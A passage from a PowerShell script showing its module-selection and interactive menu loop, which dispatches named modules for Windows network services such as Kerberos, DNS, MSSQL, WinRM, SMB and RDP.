            Write-Warn "Unknown module '$m' -- ignored (valid: 1-7, kk/cs/ditw/wrw/smb/rdp/icmp, kerberos/dns/mssql/winrm/smb/rdp/ping)"
        }
    }
    if ($resolved.Count -eq 0) {
        Write-Err "No valid modules resolved from input."
        exit 1
    }
    Invoke-Modules -ToRun $resolved
    exit 0
}

# Interactive menu loop
while ($true) {
    Show-Menu
    $userInput = Read-Host "  Enter choice(s)"
    $trimmed = $userInput.Trim()

    if ($trimmed -eq "" ) { continue }
    if ($trimmed -ieq "Q") { Write-Info "Exiting."; break }

    if ($trimmed -ieq "S") {
        Show-Status
        continue
    }

    if ($trimmed -ieq "A") {
        $toRun = $script:ExecOrder | Where-Object { $script:ModuleDefs[$_].Present }
        if (-not $toRun) {
            Write-Warn "No target roles detected -- nothing to run."
        } else {
            Invoke-Modules -ToRun $toRun
        }
        continue
    }

    $tokens   = $trimmed -split '[,\s]+' | Where-Object { $_ -ne "" }
    $resolved = @()
    foreach ($t in $tokens) {
        $name = Resolve-ModuleName $t
        if ($name) { $resolved += $name }
        else        { Write-Warn "Unknown token '$t' -- skipped" }
    }

    if ($resolved.Count -gt 0) {
        Invoke-Modules -ToRun ($resolved | Select-Object -Unique)
    }
}
